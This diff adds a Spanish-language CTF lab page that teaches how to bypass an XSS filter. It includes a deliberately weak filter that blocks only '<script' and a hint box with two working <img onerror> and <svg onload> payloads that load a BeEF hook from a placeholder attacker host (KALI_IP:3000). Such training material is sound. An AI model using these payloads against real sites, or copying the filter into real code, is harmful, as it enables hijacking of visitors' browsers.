@@ -1,0 +1,115 @@
+{% extends "base.html" %}
+{% block title %}C7 Nivel 2 – XSS Filter Bypass{% endblock %}
+{% block content %}
+
+<div class="flex gap-2 mb-2" style="flex-direction:column; align-items:flex-start;">
+  <a href="/challenge/7" class="btn btn-ghost" style="font-size:0.72rem; padding:0.3rem 0.8rem;">← C7 Overview</a>
+  <div class="flex gap-2">
+    <h1 style="font-size:1.4rem;">C7</h1>
+    <span class="badge badge-medium" style="align-self:center;">NIVEL 2 – WAF PARCIAL</span>
+  </div>
+  <h2>Foro Protegido™ – Bypass de Filtro XSS</h2>
+</div>
+
+<div class="level-nav">
+  <a href="/challenge/7/level1">Nivel 1 – Sin filtro</a>
+  <a href="/challenge/7/level2" class="active">Nivel 2 – WAF bypass</a>
+</div>
+
+<div class="alert alert-warn">
+  WAF activo: el tag <strong>&lt;script&gt;</strong> está bloqueado (case-insensitive). Pero hay otros vectores XSS...
+</div>
+
+<div class="grid-2" style="align-items:start;">
+  <div>
+    <div class="card">
+      <div class="url-bar">
+        <span class="method">POST</span>
+        <span class="path">/challenge/7/level2</span>
+      </div>
+      <h2>Dejar un comentario</h2>
+      <form method="POST">
+        <div class="form-group">
+          <label>Nombre</label>
+          <input type="text" name="author" placeholder="Tu nombre" autocomplete="off">
+        </div>
+        <div class="form-group">
+          <label>Comentario</label>
+          <textarea name="content" rows="3" style="width:100%; background:#000; border:1px solid var(--border); color:var(--green); font-family:var(--font-mono); font-size:0.88rem; padding:0.5rem 0.8rem; outline:none; resize:vertical; caret-color:var(--green);" placeholder="&lt;script&gt; bloqueado... ¿qué más existe?"></textarea>
+        </div>
+        <div style="display:flex; gap:0.8rem;">
+          <button type="submit" class="btn btn-primary" style="flex:1;">PUBLICAR</button>
+          <button type="submit" name="action" value="clear" class="btn btn-ghost" style="font-size:0.72rem;">Limpiar todo</button>
+        </div>
+      </form>
+
+      {% if error %}
+      <div class="alert alert-error mt-2">{{ error }}</div>
+      {% endif %}
+
+      {% if flag %}
+      <div class="flag-box mt-2">
+        <div class="flag-label">FLAG CAPTURADA</div>
+        <div class="flag-value">{{ flag }}</div>
+      </div>
+      {% endif %}
+    </div>
+
+    <div class="hint-box mt-2">
+      <div class="hint-title">vectores de bypass para BeEF</div>
+      <p>
+        El filtro bloquea <code>&lt;script</code> pero no otros tags con event handlers.<br><br>
+        <strong style="color:var(--green-dim);">Via &lt;img&gt;:</strong><br>
+        <code>&lt;img src=x onerror="var s=document.createElement('script');s.src='http://KALI_IP:3000/hook.js';document.head.appendChild(s)"&gt;</code><br><br>
+        <strong style="color:var(--green-dim);">Via &lt;svg&gt;:</strong><br>
+        <code>&lt;svg onload="var s=document.createElement('script');s.src='http://KALI_IP:3000/hook.js';document.head.appendChild(s)"&gt;</code>
+      </p>
+    </div>
+  </div>
+
+  <div>
+    <div class="card">
+      <div style="font-size:0.62rem; color:var(--muted); letter-spacing:3px; text-transform:uppercase; margin-bottom:1rem;">
+        comentarios almacenados ({{ comments|length }})
+      </div>
+
+      {% if comments %}
+        {% for author, content, timestamp in comments %}
+        <div style="border:1px solid var(--border); padding:0.7rem 0.9rem; margin-bottom:0.7rem; background:var(--surface);">
+          <div style="display:flex; justify-content:space-between; margin-bottom:0.4rem;">
+            <span style="font-size:0.72rem; color:var(--green-dim); letter-spacing:1px;">{{ author }}</span>
+            <span style="font-size:0.65rem; color:var(--muted);">{{ timestamp }}</span>
+          </div>
+          <div style="font-size:0.82rem; color:var(--text); line-height:1.6; word-break:break-word;">
+            {{ content }}
+          </div>
+        </div>
+        {% endfor %}
+      {% else %}
+        <div style="font-size:0.78rem; color:var(--muted); text-align:center; padding:1rem;">
+          Sin comentarios todavía.<span class="cursor"></span>
+        </div>
+      {% endif %}
+    </div>
+
+    <div class="card mt-2" style="font-size:0.8rem;">
+      <div style="font-size:0.62rem; color:var(--muted); letter-spacing:3px; text-transform:uppercase; margin-bottom:0.8rem;">código fuente (simulado)</div>
+      <pre style="background:#000; padding:0.8rem; overflow:auto; color:var(--text); line-height:1.8; border:1px solid var(--border); font-family:var(--font-mono); font-size:0.75rem;">
+<span style="color:var(--muted)"># Filtra &lt;script&gt; pero no otros vectores</span>
+<span style="color:var(--green-dim)">if</span> re.search(<span style="color:var(--green)">r'&lt;script'</span>,
+              content,
+              re.IGNORECASE):
+    error = <span style="color:var(--green)">"Bloqueado"</span>
+<span style="color:var(--green-dim)">else</span>:
+    <span style="color:var(--muted)"># ⚠ &lt;img onerror&gt;, &lt;svg onload&gt;</span>
+    <span style="color:var(--muted)"># no están filtrados</span>
+    db.execute(INSERT...)
+      </pre>
+      <p style="color:var(--warn); font-size:0.75rem; margin-top:0.6rem;">
+        Filtrar solo <code>&lt;script&gt;</code> es insuficiente — HTML5 tiene decenas de event handlers ejecutables.
+      </p>
+    </div>
+  </div>
+</div>
+
+{% endblock %}
